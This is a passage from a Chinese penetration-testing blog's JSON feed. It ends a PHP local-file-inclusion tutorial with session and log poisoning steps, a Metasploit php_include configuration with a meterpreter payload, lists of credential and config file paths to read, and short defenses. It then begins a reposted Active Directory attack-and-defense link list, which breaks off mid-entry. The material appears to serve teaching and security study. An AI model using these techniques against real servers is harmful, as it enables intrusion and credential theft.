data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><span class=\"label info\">没有实验完成，先挖个坑。</span></p>\n<h2 id=\"封装协议摘要\"><a class=\"anchor\" href=\"#封装协议摘要\">#</a> 封装协议摘要</h2>\n<table>\n    <tr>\n        <th>属性</th>\n        <th>支持</th>\n    </tr>\n    <tr>\n        <td>受限于 allow_url_include</td>\n        <td>仅 <em>php://input</em>、 <em>php://stdin</em>、 <em>php://memory</em> 和 <em>php://temp</em>。</td>\n    </tr>\n    <tr>\n        <td>允许读取</td>\n        <td>仅 <em>php://stdin</em>、 <em>php://input</em>、 <em>php://fd</em>、 <em>php://memory</em> 和 <em>php://temp</em>。\n        </td>\n    </tr>\n    <tr>\n        <td>允许写入</td>\n        <td>仅 <em>php://stdout</em>、 <em>php://stderr</em>、 <em>php://output</em>、 <em>php://fd</em>、\n            <em>php://memory</em> 和 <em>php://temp</em>。\n        </td>\n    </tr>\n    <tr>\n        <td>允许追加</td>\n        <td>仅 <em>php://stdout</em>、 <em>php://stderr</em>、 <em>php://output</em>、 <em>php://fd</em>、\n            <em>php://memory</em> 和 <em>php://temp</em>（等于写入）\n        </td>\n    </tr>\n    <tr>\n        <td>允许同时读写</td>\n        <td>仅 <em>php://fd</em>、 <em>php://memory</em> 和 <em>php://temp</em>。</td>\n    </tr>\n    <tr>\n        <td>支持 stat()</td>\n        <td>仅 <em>php://memory</em> 和 <em>php://temp</em>。</td>\n    </tr>\n    <tr>\n        <td>仅仅支持 stream_select()</td>\n        <td><em>php://stdin</em>、 <em>php://stdout</em>、 <em>php://stderr</em>、 <em>php://fd</em> 和 <em>php://temp</em>。\n        </td>\n    </tr>\n</table>\n<h1 id=\"文件包含姿势\"><a class=\"anchor\" href=\"#文件包含姿势\">#</a> 文件包含姿势</h1>\n<h2 id=\"文件包含session\"><a class=\"anchor\" href=\"#文件包含session\">#</a> 文件包含 session</h2>\n<p><span class=\"label info\">利用条件：</span></p>\n<p>session 的存储位置可以获取。</p>\n<ol>\n<li>通过 phpinfo 的信息可以获取到 session 的存储位置。</li>\n</ol>\n<p>通过 phpinfo 的信息，获取到 session.save_path 为 /var/lib/php5/：</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<ol start=\"2\">\n<li>另一种只能猜测了<br />\n根据各版本的中间件猜测。</li>\n</ol>\n<p><span class=\"label info\">session 中的内容可以被控制，传入恶意代码。</span></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>示例代码</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$s</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'str'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"s\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><span class=\"label info\">漏洞分析</span></p>\n<p>此 php 会将获取到的 GET 型 ctfs 变量的值存入到 session 中。</p>\n<p>当访问 http://www.xxx.com/x.php?str=666 后，会在 /var/lib/php5 目录下存储 session 的值。</p>\n<p>session 的文件名为 sess_+sessionid，sessionid 可以通过开发者模式获取。</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<p>所以 session 的文件名为 sess_88565500f4af7f5e934c59c0ba643a60</p>\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n<p>到服务器的 /var/lib/php/session 目录下查看果然存在此文件，内容为：</p>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<p>可以看到 666 已经存里面了</p>\n<p><span class=\"label info\">漏洞利用</span><br />\n通过上面的分析，可以知道 str 传入的值会存储到 session 文件中，如果存在本地文件包含漏洞，就可以通过 str 写入恶意代码到 session 文件中，然后通过文件包含漏洞执行此恶意代码 getshell。</p>\n<p>当访问 http://www.xxx.com/x.php?str=&lt;?php phpinfo ();?&gt; 后，会在 /var/lib/php5 目录下存储 session 的值。</p>\n<p><img data-src=\"image006.png\" alt=\"\" /></p>\n<p><span class=\"label info\">结果</span></p>\n<p><img data-src=\"image007.png\" alt=\"\" /></p>\n<h2 id=\"文件包含日志\"><a class=\"anchor\" href=\"#文件包含日志\">#</a> 文件包含日志</h2>\n<p>利用条件：需要知道服务器日志的存储路径，且日志文件可读。</p>\n<p>很多时候，web 服务器会将请求写入到日志文件中，比如说 apache。在用户发起请求时，会将请求写入 access.log，当发生错误时将错误写入 error.log。默认情况下，日志保存路径在 /var/log/apache2/。</p>\n<p><span class=\"label danger\">💔必须要更改数据包的访问请求才行，不然在日志文件里会被转码。</span></p>\n<p><span class=\"label info\">示例</span><br />\n<img data-src=\"image014.png\" alt=\"\" /></p>\n<p><span class=\"label success\">✔️还可以在 User-Agent 里插入 payload</span></p>\n<p><img data-src=\"image015.png\" alt=\"\" /></p>\n<p><span class=\"label danger\">💔有的日志文件里不一定会显示 UA 信息</span><br />\n<span class=\"label info\">示例</span><br />\n<img data-src=\"image017.png\" alt=\"\" /><br />\n这是因为 Apache 配置</p>\n<p><img data-src=\"image016.png\" alt=\"\" /></p>\n<p>详情见：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWxmLWZlcnJ5LmdpdGh1Yi5pby8yMDIxLzAxLzIyL2FwYWNoZSVFOCVBRSVCRiVFOSU5NyVBRSVFNiU5NyVBNSVFNSVCRiU5NyVFOCVBRiVBNiVFOCVBNyVBMyVFMyU4MCU5MCVFOCVCRCVBQyVFMyU4MCU5MS8=\">https://self-ferry.github.io/2021/01/22/apache 访问日志详解【转】/</span></p>\n<h2 id=\"msf-攻击模块\"><a class=\"anchor\" href=\"#msf-攻击模块\">#</a> MSF 攻击模块</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>举个例子</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>use exploit/unix/webapp/php_include</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">set</span> rhost <span class=\"token number\">192.168</span>.199.12</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">set</span> rport <span class=\"token number\">80</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token builtin class-name\">set</span> phpuri /index.php?file<span class=\"token operator\">=</span>xxLFIxx</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">set</span> path http://192.168.199.147/</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token builtin class-name\">set</span> payload php/meterpreter/bind_tcp</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token builtin class-name\">set</span> srvport <span class=\"token number\">8888</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>exploit -z</pre></td></tr></table></figure><h1 id=\"常见的敏感信息路径\"><a class=\"anchor\" href=\"#常见的敏感信息路径\">#</a> 常见的敏感信息路径</h1>\n<h2 id=\"windows系统\"><a class=\"anchor\" href=\"#windows系统\">#</a> <span class=\"label info\">Windows 系统</span></h2>\n<p>c:\\boot.ini// 查看系统版本</p>\n<p>c:\\windows\\system32\\inetsrv\\MetaBase.xml// IIS 配置文件</p>\n<p>c:\\windows\\repair\\sam // 存储 Windows 系统初次安装的密码</p>\n<p>c:\\ProgramFiles\\mysql\\my.ini// MySQL 配置</p>\n<p>c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD// MySQL root 密码</p>\n<p>c:\\windows\\php.ini//php 配置信息</p>\n<h2 id=\"linuxunix系统\"><a class=\"anchor\" href=\"#linuxunix系统\">#</a> <span class=\"label info\">Linux/Unix 系统</span></h2>\n<p>/etc/passwd// 账户信息</p>\n<p>/etc/shadow// 账户密码文件</p>\n<p>/usr/local/app/apache2/conf/httpd.conf// Apache2 默认配置文件</p>\n<p>/usr/local/app/apache2/conf/extra/httpd-vhost.conf// 虚拟网站配置</p>\n<p>/usr/local/app/php5/lib/php.ini// PHP 相关配置</p>\n<p>/etc/httpd/conf/httpd.conf// Apache 配置文件</p>\n<p>/etc/my.conf//mysql 配置文件</p>\n<h2 id=\"日志默认路径\"><a class=\"anchor\" href=\"#日志默认路径\">#</a> <span class=\"label info\">日志默认路径</span></h2>\n<p>apache+Linux 日志默认路径</p>\n<p><code>/etc/httpd/logs/access_log</code></p>\n<p>或者</p>\n<p><code>/var/log/httpd/access log</code></p>\n<p>apache+win2003 日志默认路径</p>\n<p><code>D:/xampp/apache/logs/access.log</code></p>\n<p><code>D:/xampp/apache/logs/error.log</code></p>\n<p>IIS6.0+win2003 默认日志文件</p>\n<p><code>C:/WINDOWS/system32/Logfiles</code></p>\n<p>IIS7.0+win2003 默认日志文件</p>\n<p><code>%SystemDrive%/inetpub/logs/LogFiles</code></p>\n<p>nginx 日志文件在用户安装目录的 logs 目录下</p>\n<p>如安装目录为 /usr/local/nginx, 则日志目录就是在</p>\n<p><code>/usr/local/nginx/logs</code></p>\n<p>也可通过其配置文件 Nginx.conf，获取到日志的存在路径</p>\n<p><code>/opt/nginx/logs/access.log</code></p>\n<p>web 中间件默认配置</p>\n<p>apache+linux 默认配置文件</p>\n<p><code>/etc/httpd/conf/httpd.conf</code></p>\n<p>或者</p>\n<p><code>index.php?page=/etc/init.d/httpd</code></p>\n<p>IIS6.0+win2003 配置文件</p>\n<p><code>C:/Windows/system32/inetsrv/metabase.xml</code></p>\n<p>IIS7.0+WIN 配置文件</p>\n<p><code>C:/Windows/System32/inetsrv/config/application/Host.config</code></p>\n<h1 id=\"文件包含漏洞的防御\"><a class=\"anchor\" href=\"#文件包含漏洞的防御\">#</a> 文件包含漏洞的防御</h1>\n<ol>\n<li>PHP 中使用 open_basedir 配置限制访问在指定的区域</li>\n<li>过滤.（点）/（反斜杠）\\（反斜杠）</li>\n<li>禁止服务器远程文件包含</li>\n</ol>\n<h1 id=\"参考\"><a class=\"anchor\" href=\"#参考\">#</a> 参考</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE4MjI4MC5odG1s\">https://www.freebuf.com/articles/web/182280.html</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucGhwLmNuL3RvdXRpYW8tNDE0NzkwLmh0bWw=\">https://www.php.cn/toutiao-414790.html</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25pOWh0bWFyMy9hcnRpY2xlL2RldGFpbHMvNjk4MTIzMDY=\">https://blog.csdn.net/ni9htmar3/article/details/69812306</span></p>\n",
            "tags": [
                "文件包含"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Reference/AD-Attack-Defense/",
            "url": "https://or0kit.github.io/PenetrationTest/Reference/AD-Attack-Defense/",
            "title": "Active Directory Kill Chain Attack & Defense【转】",
            "date_published": "2021-01-18T07:08:48.000Z",
            "content_html": "<h1 id=\"active-directory-kill-chain-attack-defense\"><a class=\"anchor\" href=\"#active-directory-kill-chain-attack-defense\">#</a> Active Directory Kill Chain Attack &amp; Defense</h1>\n<img width=\"650\" data-src=\"https://camo.githubusercontent.com/9547d8152e3490a6e5e3da0279faab64340885be/68747470733a2f2f646f63732e6d6963726f736f66742e636f6d2f656e2d75732f616476616e6365642d7468726561742d616e616c79746963732f6d656469612f61747461636b2d6b696c6c2d636861696e2d736d616c6c2e6a7067\">\n<h2 id=\"summary\"><a class=\"anchor\" href=\"#summary\">#</a> Summary</h2>\n<p>This document was designed to be a useful, informational asset for those looking to understand the specific tactics, techniques, and procedures (TTPs) attackers are leveraging to compromise active directory and guidance to mitigation, detection, and prevention. And understand Active Directory Kill Chain Attack and Modern Post Exploitation Adversary Tradecraft Activity.</p>\n<h2 id=\"table-of-contents\"><a class=\"anchor\" href=\"#table-of-contents\">#</a> Table of Contents</h2>\n<ul>\n<li><a href=\"#discovery\">Discovery</a></li>\n<li><a href=\"#privilege-escalation\">Privilege Escalation</a></li>\n<li><a href=\"#defense-evasion\">Defense Evasion</a></li>\n<li><a href=\"#credential-dumping\">Credential Dumping</a></li>\n<li><a href=\"#lateral-movement\">Lateral Movement</a></li>\n<li><a href=\"#persistence\">Persistence</a></li>\n<li><a href=\"#defense-&amp;-detection\">Defense &amp; Detection</a></li>\n</ul>\n<hr />\n<h2 id=\"discovery\"><a class=\"anchor\" href=\"#discovery\">#</a> Discovery</h2>\n<h3 id=\"spn-scanning\"><a class=\"anchor\" href=\"#spn-scanning\">#</a> SPN Scanning</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0xNTA4\">SPN Scanning – Service Discovery without Network Port Scanning</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zb2NpYWwudGVjaG5ldC5taWNyb3NvZnQuY29tL3dpa2kvY29udGVudHMvYXJ0aWNsZXMvMTg5OTYuYWN0aXZlLWRpcmVjdG9yeS1wb3dlcnNoZWxsLXNjcmlwdC10by1saXN0LWFsbC1zcG5zLXVzZWQuYXNweA==\">Active Directory: PowerShell script to list all SPNs used</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN0ZWFsdGhiaXRzLmNvbS9kaXNjb3ZlcmluZy1zZXJ2aWNlLWFjY291bnRzLXdpdGhvdXQtdXNpbmctcHJpdmlsZWdlcy8=\">Discovering Service Accounts Without Using Privileges</span></li>\n</ul>\n<h3 id=\"data-mining\"><a class=\"anchor\" href=\"#data-mining\">#</a> Data Mining</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90aGV2aXZpLm5ldC8yMDE4LzA1LzIzL2EtZGF0YS1odW50aW5nLW92ZXJ2aWV3Lw==\">A Data Hunting Overview</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFybWoweS5uZXQvYmxvZy9yZWR0ZWFtaW5nL3B1c2gtaXQtcHVzaC1pdC1yZWFsLWdvb2Qv\">Push it, Push it Real Good</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm5ldHNwaS5jb20vZmluZGluZy1zZW5zaXRpdmUtZGF0YS1kb21haW4tc3FsLXNlcnZlcnMtdXNpbmctcG93ZXJ1cHNxbC8=\">Finding Sensitive Data on Domain SQL Servers using PowerUpSQL</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1aSU93X3hmcWtLTQ==\">Sensitive Data Discovery in Email with MailSniper</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZm9ydHlub3J0aHNlY3VyaXR5LmNvbS9yZW1vdGVseS1zZWFyY2gv\">Remotely Searching for Sensitive Files</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5oYXJtajB5Lm5ldC9ibG9nL3BlbmV0ZXN0aW5nL2ktaHVudC1zeXNhZG1pbnMv\">I Hunt Sysadmins - harmj0y</span></li>\n</ul>\n<h3 id=\"user-hunting\"><a class=\"anchor\" href=\"#user-hunting\">#</a> User Hunting</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3Jvd2RzdHJpa2UuY29tL2Jsb2cvaGlkZGVuLWFkbWluaXN0cmF0aXZlLWFjY291bnRzLWJsb29kaG91bmQtdG8tdGhlLXJlc2N1ZS8=\">Hidden Administrative Accounts: BloodHound to the Rescue</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0yNTM1\">Active Directory Recon Without Admin Rights</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0zNzE5\">Gathering AD Data with the Active Directory PowerShell Module</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5sYWJvZmFwZW5ldHJhdGlvbnRlc3Rlci5jb20vMjAxOC8xMC9kb21haW4tZW51bWVyYXRpb24tZnJvbS1Qb3dlclNoZWxsLUNMTS5odG1s\">Using ActiveDirectory module for Domain Enumeration from PowerShell Constrained Language Mode</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL05ldFNQSS9Qb3dlclVwU1FML3dpa2kvQWN0aXZlLURpcmVjdG9yeS1SZWNvbi1GdW5jdGlvbnM=\">PowerUpSQL Active Directory Recon Functions</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2l4ZHViLm5ldC8/cD01OTE=\">Derivative Local Admin</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm5ldHNwaS5jb20vZHVtcGluZy1hY3RpdmUtZGlyZWN0b3J5LWRvbWFpbi1pbmZvLXdpdGgtcG93ZXJ1cHNxbC8=\">Dumping Active Directory Domain Info – with PowerUpSQL!</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFybWoweS5uZXQvYmxvZy9yZWR0ZWFtaW5nL2xvY2FsLWdyb3VwLWVudW1lcmF0aW9uLw==\">Local Group Enumeration</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN0ZWFsdGhiaXRzLmNvbS9sb2NhbC1hZG1pbi1tYXBwaW5nLWJsb29kaG91bmQ=\">Attack Mapping With Bloodhound</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxOC8wNS8yOC9zaXR1YXRpb25hbC1hd2FyZW5lc3Mv\">Situational Awareness</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamF2ZWxpbi1uZXR3b3Jrcy5jb20vc3RhdGljLzVmY2M2ZTg0LnBkZg==\">Commands for Domain Network Compromise</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFybWoweS5uZXQvYmxvZy9hY3RpdmVkaXJlY3RvcnkvYS1wZW50ZXN0ZXJzLWd1aWRlLXRvLWdyb3VwLXNjb3Bpbmcv\">A Pentester’s Guide to Group Scoping</span></li>\n</ul>\n<h3 id=\"laps\"><a class=\"anchor\" href=\"#laps\">#</a> LAPS</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0zMTY0\">Microsoft LAPS Security &amp; Active Directory LAPS Configuration Recon</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFybWoweS5uZXQvYmxvZy9wb3dlcnNoZWxsL3J1bm5pbmctbGFwcy13aXRoLXBvd2Vydmlldy8=\">Running LAPS with PowerView</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yYXN0YW1vdXNlLm1lL3RhZ3MvbGFwcy8=\">RastaMouse LAPS Part 1 &amp; 2</span></li>\n</ul>\n<h3 id=\"applocker\"><a class=\"anchor\" href=\"#applocker\">#</a> AppLocker</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yYXN0YW1vdXNlLm1lLzIwMTgvMDkvZW51bWVyYXRpbmctYXBwbG9ja2VyLWNvbmZpZy8=\">Enumerating AppLocker Config</span></li>\n</ul>\n<h3 id=\"azure\"><a class=\"anchor\" href=\"#azure\">#</a> Azure</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvRGlya2phbk1vbGxlbWEvaW0taW4teW91ci1jbG91ZC1yZWFkaW5nLWV2ZXJ5b25lcy1lbWFpbC1oYWNraW5nLWF6dXJlLWFkLXZpYS1hY3RpdmUtZGlyZWN0b3J5\">I'm in your cloud... reading everyone's email. Hacking Azure AD via Active Directory</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm5ldHNwaS5jb20vdXRpaWx6aW5nLWF6dXJlLWZvci1yZWQtdGVhbS1lbmdhZ2VtZW50cy8=\">Utilizing Azure Services for Red Team Engagements</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zcGVha2VyZGVjay5jb20vdHdlZWtmYXdrZXMvYmx1ZS1jbG91ZC1vZi1kZWF0aC1yZWQtdGVhbWluZy1henVyZS0x\">Blue Cloud of Death: Red Teaming Azure</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnhwbnNlYy5jb20vYXp1cmVhZC1jb25uZWN0LWZvci1yZWR0ZWFtLw==\">Azure AD Connect for Red Teamers</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toaWxsc2luZm9zZWMuY29tL3JlZC10ZWFtaW5nLW1pY3Jvc29mdC1wYXJ0LTEtYWN0aXZlLWRpcmVjdG9yeS1sZWFrcy12aWEtYXp1cmUv\">Red Teaming Microsoft: Part 1 – Active Directory Leaks via Azure</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy93cC1jb250ZW50L3VwbG9hZHMvMjAxOS8wOC8yMDE5LUJsYWNrSGF0LVVTLU1ldGNhbGYtTW9yb3djenluc2tpLUF0dGFja2luZ0FuZERlZmVuZGluZ1RoZU1pY3Jvc29mdENsb3VkLnBkZg==\">Attacking &amp; Defending the Microsoft Cloud</span></li>\n</ul>\n<h3 id=\"active-directory-federation-services\"><a class=\"anchor\" href=\"#active-directory-federation-services\">#</a> Active Directory Federation Services</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1vVHlMZEFVanczMA==\">118 Attacking ADFS Endpoints with PowerShell Karl Fosaaen</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm5ldHNwaS5jb20vdXNpbmctcG93ZXJzaGVsbC1pZGVudGlmeS1mZWRlcmF0ZWQtZG9tYWlucy8=\">Using PowerShell to Identify Federated Domains</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21kc2VjcmVzZWFyY2gvTHluY1NuaXBlcg==\">LyncSniper: A tool for penetration testing Skype for Business and Lync deployments</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvRG91Z2xhc0JpZW5zdG9jay90cm9vcGVycy0xOS1pLWFtLWFkLWZzLWFuZC1zby1jYW4teW91\">Troopers 19 - I am AD FS and So Can You</span></li>\n</ul>\n<hr />\n<h2 id=\"privilege-escalation\"><a class=\"anchor\" href=\"#privilege-escalation\">#</a> Privilege Escalation</h2>\n<h3 id=\"zerologon\"><a class=\"anchor\" href=\"#zerologon\">#</a> Zerologon</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JzbXVkZ2UvWmVyb0xvZ29uLUJPRg==\">Cobalt Strike ZeroLogon-BOF</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RpcmtqYW5tL0NWRS0yMDIwLTE0NzI=\">CVE-2020-1472 POC</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjdXJhLmNvbS9ibG9nL3plcm8tbG9nb24=\">Zerologon: instantly become domain admin by subverting Netlogon cryptography (CVE-2020-1472)</span></li>\n</ul>\n<h3 id=\"passwords-in-sysvol-group-policy-preferences\"><a class=\"anchor\" href=\"#passwords-in-sysvol-group-policy-preferences\">#</a> Passwords in SYSVOL &amp; Group Policy Preferences</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0yMjg4\">Finding Passwords in SYSVOL &amp; Exploiting Group Policy Preferences</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnJhcGlkNy5jb20vMjAxNi8wNy8yNy9wZW50ZXN0aW5nLWluLXRoZS1yZWFsLXdvcmxkLWdyb3VwLXBvbGljeS1wd25hZ2Uv\">Pentesting in the Real World: Group Policy Pwnage</span></li>\n</ul>\n<h3 id=\"ms14-068-kerberos-vulnerability\"><a class=\"anchor\" href=\"#ms14-068-kerberos-vulnerability\">#</a> MS14-068 Kerberos Vulnerability</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD01MjU=\">MS14-068: Vulnerability in (Active Directory) Kerberos Could Allow Elevation of Privilege</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYWJzLm13cmluZm9zZWN1cml0eS5jb20vYmxvZy9kaWdnaW5nLWludG8tbXMxNC0wNjgtZXhwbG9pdGF0aW9uLWFuZC1kZWZlbmNlLw==\">Digging into MS14-068, Exploitation and Defence</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudHJ1c3RlZHNlYy5jb20vMjAxNC8xMi9tczE0LTA2OC1mdWxsLWNvbXByb21pc2Utc3RlcC1zdGVwLw==\">From MS14-068 to Full Compromise – Step by Step</span></li>\n</ul>\n<h3 id=\"dnsadmins\"><a class=\"anchor\" href=\"#dnsadmins\">#</a> DNSAdmins</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5sYWJvZmFwZW5ldHJhdGlvbnRlc3Rlci5jb20vMjAxNy8wNS9hYnVzaW5nLWRuc2FkbWlucy1wcml2aWxlZ2UtZm9yLWVzY2FsYXRpb24taW4tYWN0aXZlLWRpcmVjdG9yeS5odG1s\">Abusing DNSAdmins privilege for escalation in Active Directory</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD00MDY0\">From DNSAdmins to Domain Admin, When DNSAdmins is More than Just DNS Administration</span></li>\n</ul>\n<h3 id=\"kerberos-delegation\"><a class=\"anchor\" href=\"#kerberos-delegation\">#</a> Kerberos Delegation</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaGVuYW5pZ2Fuc2xhYnMuaW8vbWVkaWEvQ29uc3RydWN0aW5nJTIwS2VyYmVyb3MlMjBBdHRhY2tzJTIwd2l0aCUyMERlbGVnYXRpb24lMjBQcmltaXRpdmVzLnBkZg==\">Constructing Kerberos Attacks with Delegation Primitives</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cucmVkeG9yYmx1ZS5jb20vMjAxOS8xMi9uby1zaGVsbHMtcmVxdWlyZWQtdXNpbmctaW1wYWNrZXQtdG8uaHRtbA==\">No Shells Required - a Walkthrough on Using Impacket and Kerberos to Delegate Your Way to DA</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm5ldHNwaS5jb20vY3ZlLTIwMjAtMTcwNDkta2VyYmVyb3MtYnJvbnplLWJpdC1vdmVydmlldy8=\">CVE-2020-17049: Kerberos Bronze Bit Attack – Overview</span></li>\n</ul>\n<h4 id=\"unconstrained-delegation\"><a class=\"anchor\" href=\"#unconstrained-delegation\">#</a> Unconstrained Delegation</h4>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD00MDU2\">Domain Controller Print Server + Unconstrained Kerberos Delegation = Pwned Active Directory Forest</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0xNjY3\">Active Directory Security Risk #101: Kerberos Unconstrained Delegation (or How Compromise of a Single Server Can Compromise the Domain)</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN0ZWFsdGhiaXRzLmNvbS91bmNvbnN0cmFpbmVkLWRlbGVnYXRpb24tcGVybWlzc2lvbnMv\">Unconstrained Delegation Permissions</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYWJzLm13cmluZm9zZWN1cml0eS5jb20vYmxvZy90cnVzdC15ZWFycy10by1lYXJuLXNlY29uZHMtdG8tYnJlYWsv\">Trust? Years to earn, seconds to break</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3N0cy5zcGVjdGVyb3BzLmlvL2h1bnRpbmctaW4tYWN0aXZlLWRpcmVjdG9yeS11bmNvbnN0cmFpbmVkLWRlbGVnYXRpb24tZm9yZXN0cy10cnVzdHMtNzFmMmIzMzY4OGUx\">Hunting in Active Directory: Unconstrained Delegation &amp; Forests Trusts</span></li>\n<li><span class=\"exturl\" 